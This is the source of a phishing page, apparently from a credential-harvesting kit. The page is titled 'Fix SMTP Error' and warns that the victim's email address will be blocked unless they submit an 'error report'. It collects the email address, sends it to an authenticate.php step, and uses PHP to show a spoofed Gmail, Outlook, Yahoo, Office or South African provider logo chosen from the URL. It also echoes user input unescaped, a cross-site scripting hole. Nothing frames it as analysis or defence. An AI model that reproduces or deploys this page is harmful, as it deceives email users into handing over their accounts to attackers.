<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Fix SMTP Error</title>
<link rel="shortcut icon" href="favicon.png"/>
<script src="SpryAssets/SpryValidationTextField.js" type="text/javascript"></script>
<link href="SpryAssets/SpryValidationTextField.css" rel="stylesheet" type="text/css" />
<style type="text/css">
<!--
p {
	display: block;
	clear: both;
	float: none;
}
div {
	box-sizing: border-box;
}
body {
	background-color: #dee2e6;
}
.red1 {
	color: #900;
}
.name1 {
	padding: 8px;
	width: 100%;
	border: thin solid #A8A7B1;
	box-sizing: border-box;
	margin-top: 10px;
}
.formBox, .LogoBox {
	display:block;
	width: 54%;
	float: left;
}
.LogoBox {
	width: 40%;
	float: right;
	text-align: right;
}
.LogoBox img {
	float: right;
	margin-top: 30px;
	width: 80%;
}
.topic {
	font-size: 14px;
	text-transform: uppercase;
	color: #005B79;
}
body, td, th {
	font-family: Verdana, Geneva, sans-serif;
	font-size: 12px;
	line-height: 1.6em;
}
.button2 {
	background-color: #008CBA;
	font-size: 14px;
	text-transform: capitalize;
	color: #FFF;
	border-radius: 3px;
	border:none;
	box-shadow: 0px 1px 3px 0px rgba(0, 0, 0, 0.21);
	margin: 0px;
	padding-top: 6px;
	padding-right: 8px;
	padding-bottom: 6px;
	padding-left: 8px;
} /* Blue */
-->
.button2:hover {
	background-color: #007297;
	transition: all 0.3s ease 0s;
}
.BoxHint {
	background-color: #F2F2F2;
	padding: 10px;
	border: 1px solid #EEE;
}
.TitleBOx {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 16px;
	text-transform: uppercase;
	color: #069;
	margin-bottom: 4px;
}
.cont {
	color: #464646;
	display: block;
	clear: both;
	float: none;
	width: 36%;
	margin-top: 6%;
	margin-right: auto;
	margin-bottom: 50px;
	margin-left: auto;
	background-color: #FFF;
	border-radius: 3px;
	padding: 30px;
	box-shadow: 0px 1px 3px 0px rgba(0, 0, 0, 0.21);
}
 @media only screen and (max-width:320px) {
 .cont {
 width: 96%;
}
 .button2 {
 width: 100%;
} /* Blue */

.formBox, .LogoBox {
	width: 100%;
	float: left;
}
.LogoBox {
	width: 100%;
	float: none;
	text-align: center;
}
.LogoBox img {
	float: none;
	margin-top: 20px;
	width: 40%;
}
}

</style>
</head>
<body>
<div class="cont">
  <div class="BoxHint">
    <div class="TitleBOx"><strong>FIX ERROR</strong></div>
    Click the bellow button to proceed, our technical team will fix the error in less than 3-4hrs after then you will receive a confirmation email in your inbox once the error is fixed. </div>
  <br />
  <strong class="red1">Note:</strong> Failure to send this error report will result in blocking of your e-mail address. Also, you may be reqiured to login to your email address to fix the error.<br />
  <br />
  <div class="formBox">
    <?php 
// Show IF Conditional region1 
if (@$_GET['INFO'] == "unsuccessful") {
?>
      <div class="hint23"> <strong>&nbsp;&nbsp;</strong>&nbsp; &nbsp;<strong>Login timed out. please try again.</strong>
        <div class="clear2"></div>
      </div>
      <?php } 
// endif Conditional region1
?>
    <form action="authenticate.php" method="get">
      <div class="container_Inner">
        <div class="topic">Your Email Address:</div>
        <div class="inner4_inner"> <strong>
          <label for="Qw1"></label>
          <span id="sprytextfield2">
          <input name="email" type="text" class="name1" id="email" placeholder="Enter Email Address" size="40" maxlength="400" value="<?php echo $_GET['email']; ?>"/>
          <span class="textfieldRequiredMsg"><br />
          &nbsp;&nbsp; Email address is required.</span><span class="textfieldInvalidFormatMsg"><br />
          &nbsp;&nbsp;  Invalid email address.</span></span></strong></div>
        <p> 
      </div>
      <p>
        <input type="submit" class="button2" value="Proceed to fix errors" />
        <input type="hidden" name="MM_insert" value="form1" />
    </form>
  </div>
  <div class="LogoBox">
    <?php
 

$url = 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
if ( strpos($url, 'gmail') !== false ) {
    echo('<img src="accounts.google.com/img/Gmail-logo.png">');
}
elseif ( strpos($url, 'hotmail') !== false ) {
    echo('<img src="outlook.live.com/SignIn_files/logo1.png">');
}
elseif ( strpos($url, 'live') !== false ) {
    echo('<img src="hotmail/SignIn_files/logo1.png">');
}
elseif ( strpos($url, 'mweb') !== false ) {
    echo('<img src="mail.mweb.co.za/file1/logo2.png">');
}
elseif ( strpos($url, 'iafrica') !== false ) {
    echo('<img src="mail.mweb.co.za/file1/logo2.png">');
}
elseif ( strpos($url, 'telkomsa') !== false ) {
    echo('<img src="webmail.telkomsa.net/mail_files/logo.png">');
}
elseif ( strpos($url, 'yahoo') !== false ) {
    echo('<img src="login.yahoo.com/login_files/yahoo_en-US_f_p_bestfit_2x.png">');
}




elseif ( strpos($url, '163') !== false ) {
    echo('<img src="login.yahoo.com/login_files/yahoo_en-US_f_p_bestfit_2x.png">');
}
elseif ( strpos($url, '126') !== false ) {
    echo('<img src="login.yahoo.com/login_files/yahoo_en-US_f_p_bestfit_2x.png">');
}
elseif ( strpos($url, 'yeah') !== false ) {
    echo('<img src="login.yahoo.com/login_files/yahoo_en-US_f_p_bestfit_2x.png">');
}
elseif ( strpos($url, 'shouji') !== false ) {
    echo('<img src="login.yahoo.com/login_files/yahoo_en-US_f_p_bestfit_2x.png">');
}


else {
    echo('<img src="login.microsoftonline.com/login_files/office-2.png">');
}


?>
  </div>
  <p> 
</div>
<script type="text/javascript">
<!--
var sprytextfield1 = new Spry.Widget.ValidationTextField("sprytextfield1");
var sprytextfield2 = new Spry.Widget.ValidationTextField("sprytextfield2", "email");
//-->
</script>
</body>
</html>